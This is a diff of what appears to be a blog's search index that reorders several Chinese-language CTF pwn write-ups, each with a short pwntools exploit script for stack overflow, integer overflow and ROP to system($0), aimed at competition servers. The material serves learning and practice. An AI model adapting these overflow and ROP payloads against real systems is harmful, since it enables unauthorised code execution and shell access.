@@ -154,33 +154,6 @@
     
     
     <entry>
-      <title>BJDCTF 2020 babystack2.0</title>
-      <link href="/pwn/8ad46297829f/"/>
-      <url>/pwn/8ad46297829f/</url>
-      
-        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309191035097.png" alt="image.png"><br>在程序中，限制了nbytes的长度，所以这里需要用到整数溢出</p><blockquote><p>《CTF竞赛权威指南》中，将整数的异常情况分为三种：溢出，回绕和截断。有符号整数发生的是溢出，对应字节数的有符号整数，最大值+1，会成为最小值，最小值-1会成为最大值，此种情况可能绕过&gt;0或&lt; 0的检测；无符号整数发生的是回绕，最大值+1变为0，最小值-1变为最大值；截断则出现在将运算结果赋值给不恰当大小的整数数据类型和不当的类型转换的情况下。</p></blockquote><p>如果在<code>nbytes</code>里面输入-1，则经过<code>(unsigned int)</code>类型转换后会变成很大的整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28774</span>)</span><br><span class="line">backdoor = <span class="number">0x0000000000400726</span></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://xz.aliyun.com/t/11047">https://xz.aliyun.com/t/11047</a></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> pwn </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> pwn </tag>
-            
-            <tag> 栈溢出 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>BJDCTF 2020 babystack</title>
       <link href="/pwn/9193847b8b0e/"/>
       <url>/pwn/9193847b8b0e/</url>
@@ -235,11 +208,38 @@
     
     
     <entry>
-      <title>GFCTF 2021 where_is_shell</title>
-      <link href="/pwn/f685e2e9198b/"/>
-      <url>/pwn/f685e2e9198b/</url>
+      <title>BJDCTF 2020 babystack2.0</title>
+      <link href="/pwn/8ad46297829f/"/>
+      <url>/pwn/8ad46297829f/</url>
       
-        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>查看程序的保护<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280927646.png" alt="image.png"><br>放入IDA中进行分析，存在栈溢出。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280925172.png" alt="image.png"><br>找到<code>system</code>函数<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280927809.png" alt="image.png"><br>但是没有在字符串中找到<code>/bin/sh</code><br>然后看到有tips，<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309281151658.png"><br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309281152829.png" alt="image.png"><br>这里可以使用<code>system($0)</code>来获得shell权限。<br>首先用垃圾数据填充栈，进行栈溢出，然后将数据放入<code>$0</code>放入rdi中，然后跳到<code>system</code>函数执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./shell&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.anna.nssctf.cn&quot;,28968)</span></span><br><span class="line"></span><br><span class="line">ret_rdi = <span class="number">0x00000000004005e3</span></span><br><span class="line">sys_addr = <span class="number">0x400430</span></span><br><span class="line">code_addr = <span class="number">0x400541</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400416</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span> * (<span class="number">0x10</span>+<span class="number">8</span>) + p64(ret_addr) + p64(ret_rdi) + p64(code_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>url</li></ul>]]></content>
+        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309191035097.png" alt="image.png"><br>在程序中，限制了nbytes的长度，所以这里需要用到整数溢出</p><blockquote><p>《CTF竞赛权威指南》中，将整数的异常情况分为三种：溢出，回绕和截断。有符号整数发生的是溢出，对应字节数的有符号整数，最大值+1，会成为最小值，最小值-1会成为最大值，此种情况可能绕过&gt;0或&lt; 0的检测；无符号整数发生的是回绕，最大值+1变为0，最小值-1变为最大值；截断则出现在将运算结果赋值给不恰当大小的整数数据类型和不当的类型转换的情况下。</p></blockquote><p>如果在<code>nbytes</code>里面输入-1，则经过<code>(unsigned int)</code>类型转换后会变成很大的整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28774</span>)</span><br><span class="line">backdoor = <span class="number">0x0000000000400726</span></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://xz.aliyun.com/t/11047">https://xz.aliyun.com/t/11047</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 栈溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>LitCTF 2023 只需要nc一下</title>
+      <link href="/pwn/d8db0fb5d872/"/>
+      <url>/pwn/d8db0fb5d872/</url>
+      
+        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><code>env</code>指令和<code>echo $FLAG</code>都可以查看FLAG。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.nssctf.cn/note/set/2175">https://www.nssctf.cn/note/set/2175</a></li></ul>]]></content>
       
       
       <categories>
@@ -260,11 +260,11 @@
     
     
     <entry>
-      <title>LitCTF 2023 只需要nc一下</title>
-      <link href="/pwn/d8db0fb5d872/"/>
-      <url>/pwn/d8db0fb5d872/</url>
+      <title>GFCTF 2021 where_is_shell</title>
+      <link href="/pwn/f685e2e9198b/"/>
+      <url>/pwn/f685e2e9198b/</url>
       
-        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><code>env</code>指令和<code>echo $FLAG</code>都可以查看FLAG。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.nssctf.cn/note/set/2175">https://www.nssctf.cn/note/set/2175</a></li></ul>]]></content>
+        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>查看程序的保护<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280927646.png" alt="image.png"><br>放入IDA中进行分析，存在栈溢出。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280925172.png" alt="image.png"><br>找到<code>system</code>函数<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280927809.png" alt="image.png"><br>但是没有在字符串中找到<code>/bin/sh</code><br>然后看到有tips，<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309281151658.png"><br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309281152829.png" alt="image.png"><br>这里可以使用<code>system($0)</code>来获得shell权限。<br>首先用垃圾数据填充栈，进行栈溢出，然后将数据放入<code>$0</code>放入rdi中，然后跳到<code>system</code>函数执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./shell&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.anna.nssctf.cn&quot;,28968)</span></span><br><span class="line"></span><br><span class="line">ret_rdi = <span class="number">0x00000000004005e3</span></span><br><span class="line">sys_addr = <span class="number">0x400430</span></span><br><span class="line">code_addr = <span class="number">0x400541</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400416</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span> * (<span class="number">0x10</span>+<span class="number">8</span>) + p64(ret_addr) + p64(ret_rdi) + p64(code_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>url</li></ul>]]></content>
       
       
       <categories>
@@ -362,33 +362,6 @@
     
     
     <entry>
-      <title>SWPUCTF 2021 新生赛 gift_pwn</title>
-      <link href="/pwn/af4b3c760574/"/>
-      <url>/pwn/af4b3c760574/</url>
-      
-        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309182115394.png" alt="image.png"></p><ul><li>Arch: 程序架构信息，判断是64位还是32位</li><li>RELRO: 此技术主要针对GOT改写的攻击方式，它分为两种，Partial RELRO 和 Full RELRO<ul><li>Partial RELRO易受到攻击</li><li>Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号</li></ul></li><li>Stack-canary: 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode执行，在Linux中我们将cookie信息称为canary。</li><li>NX: NX开启意味着栈中数据没有执行权限，当攻击者在堆栈上部署自己的shellcode并处罚时，只会造成程序崩溃，可以利用rop方法绕过。</li><li>PIE: 在编译时将程序编译为位置无关，即程序运行时各个段加载的虚拟地址也是在装载时才确定。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>经过checksec分析，该程序是一个64位的程序，并且没有开启栈保护。<br>然后放到ida64中进行分析。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309182116259.png" alt="image.png"><br>只有一个vuln()函数，进入函数查看具体实现<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190900558.png" alt="image.png"><br>因此，payload思路就是先填满buf的10h内容，然后覆盖调用函数的ebp，就可以写入指定的地址覆盖eip，达到控制程序流的目的。<br>查看gift的程序地址<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190910304.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28447</span>)</span><br><span class="line">git_addr = <span class="number">0x00000000004005B6</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x10</span> + <span class="string">b&#x27;bbbbbbbb&#x27;</span> + p64(git_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://bbs.kanxue.com/thread-270947.htm">https://bbs.kanxue.com/thread-270947.htm</a></li><li><a href="https://bbs.kanxue.com/thread-271236.htm">https://bbs.kanxue.com/thread-271236.htm</a></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> pwn </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> pwn </tag>
-            
-            <tag> 栈溢出 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>jarvisoj_level2_x64</title>
       <link href="/pwn/145c9ce4068b/"/>
       <url>/pwn/145c9ce4068b/</url>
@@ -408,6 +381,33 @@
             <tag> pwn </tag>
             
             <tag> 栈迁移 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SWPUCTF 2021 新生赛 gift_pwn</title>
+      <link href="/pwn/af4b3c760574/"/>
+      <url>/pwn/af4b3c760574/</url>
+      
+        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309182115394.png" alt="image.png"></p><ul><li>Arch: 程序架构信息，判断是64位还是32位</li><li>RELRO: 此技术主要针对GOT改写的攻击方式，它分为两种，Partial RELRO 和 Full RELRO<ul><li>Partial RELRO易受到攻击</li><li>Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号</li></ul></li><li>Stack-canary: 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode执行，在Linux中我们将cookie信息称为canary。</li><li>NX: NX开启意味着栈中数据没有执行权限，当攻击者在堆栈上部署自己的shellcode并处罚时，只会造成程序崩溃，可以利用rop方法绕过。</li><li>PIE: 在编译时将程序编译为位置无关，即程序运行时各个段加载的虚拟地址也是在装载时才确定。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>经过checksec分析，该程序是一个64位的程序，并且没有开启栈保护。<br>然后放到ida64中进行分析。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309182116259.png" alt="image.png"><br>只有一个vuln()函数，进入函数查看具体实现<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190900558.png" alt="image.png"><br>因此，payload思路就是先填满buf的10h内容，然后覆盖调用函数的ebp，就可以写入指定的地址覆盖eip，达到控制程序流的目的。<br>查看gift的程序地址<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190910304.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28447</span>)</span><br><span class="line">git_addr = <span class="number">0x00000000004005B6</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x10</span> + <span class="string">b&#x27;bbbbbbbb&#x27;</span> + p64(git_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://bbs.kanxue.com/thread-270947.htm">https://bbs.kanxue.com/thread-270947.htm</a></li><li><a href="https://bbs.kanxue.com/thread-271236.htm">https://bbs.kanxue.com/thread-271236.htm</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 栈溢出 </tag>
             
         </tags>
       
